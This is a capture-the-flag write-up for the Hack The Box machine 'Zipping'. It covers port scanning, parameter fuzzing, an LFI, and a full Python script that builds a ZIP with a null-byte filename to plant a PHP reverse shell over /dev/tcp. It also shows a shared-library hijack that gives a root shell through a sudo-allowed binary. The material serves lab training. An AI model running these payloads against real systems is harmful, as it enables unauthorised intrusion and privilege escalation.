@@ -1,0 +1,178 @@
+=================================================================================================
+													******** HTB - machines: Zipping ********
+==================================================================================================
+Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
+machine.
+
+** export IP=10.10.11.229
+** nmap -n -Pn -p- $IP --open
+
+Nmap scan report for 10.10.11.229
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+** nmap -n -Pn -p 22,80 -sC -sV $IP
+
+Nmap scan report for 10.10.11.229
+Host is up (0.16s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
+|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
+|_http-title: Zipping | Watch store
+|_http-server-header: Apache/2.4.54 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+===================================================================================================
+-- Host enumeration:
+====================
+OS: Linux Ubuntu
+Web app technology: Apache 2.4.54
+Web server technology: PHP
+
+====================================================================================================
+-- Exploitation walkthrough:
+============================
+Since we dont have a valid user creds, I skipped the ssh service and focused on the web application.
+
+In the web app, I could see that there is a upload.php feature that takes a zip file containing a 
+single pdf file.
+
+There is also a link to a shop page which is different from the landing page. This page has a 'page'
+url param and we can do a limited LFI to view .php files in the 'html' web app directory.
+
+http://10.10.11.229/shop/index.php?page=products
+http://10.10.11.229/shop/index.php?page=product&id=2
+http://10.10.11.229/shop/index.php?page=../upload
+
+By parameter fuzzing, I found valid params namely: cart, product, and products with below command:
+
+** ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://10.10.11.229/shop/index.php?page=FUZZ -c -ic -fs 2615
+
+The path to the foothold is via the upload feature in the /upload.php pth and the limited LFI on the
+/shop/index.php?page= URL path.
+
+To exploit the file upload feature, we need to create a php webshell or reverse shell in a file and
+name it with 'filename\x00.pdf'.
+
+The exploit i used created a zip file from scratch using python and via the link below for guidance on
+the right bytes to use. https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html
+
+After executing the script i got a revshell and thus a foothold on the machine.
+
+For privesc, I needed to explit a stock binary located at /usr/bin/stock which was the only binary the
+user was allowed to execute via sudo. This was known by running 'sudo -l'.
+
+Using the strings tool on the binary, I was able to know the password for the user which i used to 
+execute the binary.
+
+** strings /usr/bin/stock		=>		St0ckM4nager
+** sudo /usr/bin/stock
+** # password: St0ckM4nager
+
+From the same forum, we need to exploit a Shared library misconfiguration vuln used in the stock binary
+
+The C code used is seen below.
+
+#include <unistd.h>
+
+void begin (void) __attribute__((destructor));
+
+void begin (void) {
+    system("bash -p");
+}
+
+I save the C code to a file, sent it to the victim's machine, and ran the below command to compile it
+
+** gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC lac.c
+
+Next i executed the stock binary again, and type '3' to exit the program. Once exited, I became root.
+
+Thee python code used to get the foot hold is seen below.
+
+
+from struct import pack
+import argparse
+import zlib
+import requests
+
+parser = argparse.ArgumentParser(description='Exploit Zipper')
+parser.add_argument('-L', '--listener_ip', help='listener ip')
+parser.add_argument('-R', '--target_ip', help='target ip')
+args = parser.parse_args()
+
+filename1 = b'rev.php.pdf'
+filename2 = b'rev.php\x00.pdf'
+
+filecontent = b"""<?php system("bash -c 'bash -i >& /dev/tcp/"""+args.listener_ip.encode()+b"""/4433 0>&1'"); ?>"""
+length = len(filecontent)
+crc = zlib.crc32(filecontent)
+
+
+p  = b''
+p += b'\x50\x4b\x03\x04' # magic bytes
+p += b'\x14\x00' # version
+p += b'\x00\x00' # flags
+p += b'\x00\x00' # compression
+p += b'\x48\xb9' # modtime
+p += b'\x1b\x57' # moddate
+p += pack("<L", crc) # crc
+p += pack("<L", length) # compressed size
+p += pack("<L", length) # uncompressed size
+p += pack("<H", len(filename1)) # filename len
+p += b'\x00\x00' # extra field len
+p += filename1
+p += filecontent
+
+# central directory
+cd  = b''
+cd += b'\x50\x4b\x01\x02' # magic bytes
+cd += b'\x14\x03' # version
+cd += b'\x14\x00' # version needed
+cd += b'\x00\x00' # flags
+cd += b'\x00\x00' # compression
+cd += b'\x48\xb9' # modtime
+cd += b'\x1b\x57' # moddate
+cd += pack("<L", crc) # crc
+cd += pack("<L", length) # compressed size
+cd += pack("<L", length) # uncompressed size
+cd += pack("<H", len(filename2)) # filename len
+cd += b'\x00\x00' # extra field len
+cd += b'\x00\x00' # file comm. len
+cd += b'\x00\x00' # disk start
+cd += b'\x00\x00' # internal attr.
+cd += b'\x00\x00\xA4\x81' # external attr
+cd += b'\x00\x00\x00\x00' # offset of local header
+cd += filename2
+
+# end of centryl directory record
+ecd  = b''
+ecd += b'\x50\x4b\x05\x06' # magic bytes
+ecd += b'\x00\x00' # disk number
+ecd += b'\x00\x00' # disc # w/cd
+ecd += b'\x01\x00' # disc entries
+ecd += b'\x01\x00' # total entries
+ecd += pack("<L", len(cd)) # central directory size
+ecd += pack("<L", len(p))
+ecd += b'\x00\x00'
+
+f = open("rev.zip", "wb")
+f.write(p+cd+ecd)
+f.close()
+
+url = "http://{}/upload.php".format(args.target_ip)
+headers = {"Content-Type":'multipart/form-data'}
+files = {'submit':(None,''),'zipFile':('rev.zip',p+cd+ecd)}
+resp = requests.post(url, files=files)
+
+for line in resp.text.split('\n'):
+    if 'uploads' in line:
+        requests.get("http://{}/{}".format(args.target_ip,line.split('"')[1].split(" ")[0]))
+        exit(0)
+
+
+
